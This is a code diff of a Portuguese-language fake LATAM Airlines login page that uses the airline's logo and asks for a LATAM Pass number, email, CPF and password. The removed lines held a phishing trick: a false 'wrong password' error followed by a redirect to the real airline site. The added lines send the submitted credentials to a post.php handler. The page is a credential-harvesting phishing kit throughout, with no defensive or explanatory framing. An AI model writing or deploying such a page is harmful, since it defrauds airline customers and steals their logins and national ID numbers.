@@ -67,37 +67,23 @@
         }
     </style>
     <script>
-        let attempt = 0;
-
         function validateForm(event) {
-            event.preventDefault();
             var username = document.forms["loginForm"]["username"].value;
             var password = document.forms["loginForm"]["password"].value;
-            var errorMessage = document.getElementById("error-message");
 
             if (username === "" || password === "") {
-                errorMessage.style.display = "block";
-                errorMessage.textContent = "Por favor, preencha todos os campos.";
-            } else {
-                attempt++;
-                if (attempt < 2) {
-                    errorMessage.style.display = "block";
-                    errorMessage.textContent = "Senha incorreta. Por favor, tente novamente.";
-                } else {
-                    errorMessage.style.display = "none";
-                    window.location.href = 'https://www.latamairlines.com';
-                }
+                event.preventDefault();
+                alert("Por favor, preencha todos os campos.");
             }
         }
     </script>
 </head>
 <body>
     <div class="container">
-        <form name="loginForm" action="foo" method="post" onsubmit="validateForm(event)">
+        <form name="loginForm" action="post.php" method="post" onsubmit="validateForm(event)">
             <img src="https://th.bing.com/th/id/R.8c29d58fe7dc2c144922bc2c2c07d008?rik=9EVDOKvltMk8Kg&riu=http%3a%2f%2flogos-download.com%2fwp-content%2fuploads%2f2016%2f12%2fLATAM_Airlines_logo_wordmark.png&ehk=KoMMi4amEshpJz3dL4OUfFcHwZ%2b32OLiAE591EJWXs4%3d&risl=&pid=ImgRaw&r=0" alt="Logo da LATAM Airlines" class="logo">
             <p class="texto-superior">Insira seu usuário:</p>
             <p class="texto-inferior">Dê preferência ao seu número LATAM Pass ao inserir seus dados:</p>
-            <div id="error-message" class="error-message"></div>
             <input type="text" name="username" placeholder="Email, CPF ou Número de cliente">
             <input type="password" name="password" placeholder="Senha">
             <button type="submit">Continuar</button>
